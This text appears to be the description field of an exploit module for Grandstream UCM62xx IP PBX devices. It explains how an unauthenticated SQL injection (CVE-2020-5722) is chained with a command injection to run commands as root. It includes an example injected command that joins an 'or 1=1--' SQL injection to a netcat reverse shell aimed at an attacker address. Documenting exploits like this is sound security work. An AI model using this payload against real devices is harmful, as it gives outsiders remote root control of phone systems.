    "Description": "This module exploits an unauthenticated SQL injection vulnerability (CVE-2020-5722) and a command injection vulnerability (technically, no assigned CVE but was inadvertently patched at the same time as CVE-2019-10662) affecting the Grandstream UCM62xx IP PBX series of devices. The vulnerabilities allow an unauthenticated remote attacker to execute commands as root. Exploitation happens in two stages: 1. An SQL injection during username lookup while executing the \"Forgot Password\" function. 2. A command injection that occurs after the user provided username is passed to a Python script via the shell. Like so: /bin/sh -c python /app/asterisk/var/lib/asterisk/scripts/sendMail.py \\ password '' `cat <<'TTsf7G0' z' or 1=1--`;`nc 10.0.0.3 4444 -e /bin/sh`;` TTsf7G0 ` This module affect UCM62xx versions before firmware version 1.0.19.20.",
